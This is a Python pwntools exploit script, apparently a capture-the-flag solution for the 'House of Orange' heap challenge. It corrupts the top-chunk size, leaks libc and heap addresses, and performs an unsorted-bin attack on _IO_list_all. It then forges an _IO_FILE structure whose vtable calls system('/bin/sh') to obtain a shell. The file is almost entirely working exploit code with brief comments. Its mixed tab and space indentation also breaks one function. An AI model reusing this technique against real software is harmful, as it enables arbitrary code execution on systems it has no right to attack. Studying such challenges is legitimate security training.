from pwn import *

context.log_level="debug"

def build_house(length,name,price,color):
	p.sendlineafter('Your choice : ', '1')
	p.sendlineafter('Length of name :',str(length))
	p.sendafter('Name :', str(name))
	p.sendlineafter('Price of Orange:', str(price))
	p.sendlineafter('Color of Orange:', str(color))

def see_the_house():
	p.sendlineafter('Your choice : ', '2')

def upgrade_house(length,name,price,color):
	p.sendlineafter('Your choice : ', '3')
        p.sendlineafter('Length of name :',str(length))
        p.sendafter('Name:', str(name))
        p.sendlineafter('Price of Orange:', str(price))
        p.sendlineafter('Color of Orange:', str(color))

p = process('./houseoforange')
e = ELF("./houseoforange")
l = e.libc

pause()
build_house(400,10,10,1)

####free old top chunk
payload = 'a' * 0x190

payload += p64(0) ## next chunk : prev_size
payload += p64(33) ## next chunk : size
payload += p64(0x1f0000000a) ##next chunk : content
payload += p64(0) ##next chunk : content

payload += p64(0) ## top chunk : prev_size
payload += p64(0xe21) ## top chunk : size

upgrade_house(4000,payload,10,1) 

build_house(0x1000,10,10,1) ## call malloc : request > top chunk_size
#####################
pause()
###LEAK libc using main_arena + 88
build_house(1100,'LEAK_ADD',10,1)
see_the_house()

libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 1624 - 16
libc -= l.sym['__malloc_hook']
log.info('libc : ' + hex(libc))
log.info('sys : ' + hex(libc + l.sym['system']))
###########################

###LEAK heap_addr
upgrade_house(1000,'a' * 16, 10, 1)
see_the_house()

p.recvuntil('a' * 16)
old_top_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info('old_top_addr : ' + hex(old_top_addr))
################

pause()
###unsorted bin attack && write fake _IO_FILE
payload = 'a' * 0x450

payload += p64(0) ## next chunk : prev_size
payload += p64(33) ## next chunk : size
payload += p64(0x1f0000000a) ##next chunk : content
payload += p64(0) ##next chunk : content

payload += '/bin/sh\x00' ##fake _IO_FILE start
payload += p64(0x61) ## set size 0x61 to locate smallbin[4]
payload += p64(libc + l.sym['__malloc_hook'] + 16 + 88) ## main_arena + 88
payload += p64(libc + l.sym['_IO_list_all'] - 16) ## _IO_list_all -> main_arena + 88
payload += p64(2) ## _IO_write_base
payload += p64(3) ## _IO_write_ptr

payload += p64(libc + l.sym['system']) ## _IO_OVERFLOW
payload += 'a' * (0xc0 - 8 * 7)
payload += p64(0) ## _mode
payload += 'a' * (0xd8 - 0xc0 - 8)
payload += p64(old_top_addr + 0x450 + 8 * 9) ## vtable

upgrade_house(0x1000,payload,10,1)
#####################

pause()
p.sendlineafter('Your choice : ', '1') ## triger malloc()

p.interactive()
